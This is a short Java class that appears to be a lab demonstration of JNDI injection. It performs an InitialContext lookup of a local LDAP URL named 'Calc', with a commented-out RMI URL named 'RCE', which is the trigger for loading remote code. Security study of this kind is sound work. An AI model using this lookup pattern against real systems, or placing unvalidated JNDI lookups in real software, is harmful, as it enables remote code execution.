package com.sec.cwm.base.jndi;

import javax.naming.InitialContext;
import javax.naming.NamingException;
public class JNDIClient {
    public static void main(String[] args) throws NamingException{
//        String uri = "rmi://127.0.0.1:7800/RCE";
        String uri = "ldap://127.0.0.1:9999/Calc";
        InitialContext initialContext = new InitialContext();
        initialContext.lookup(uri);
    }
}
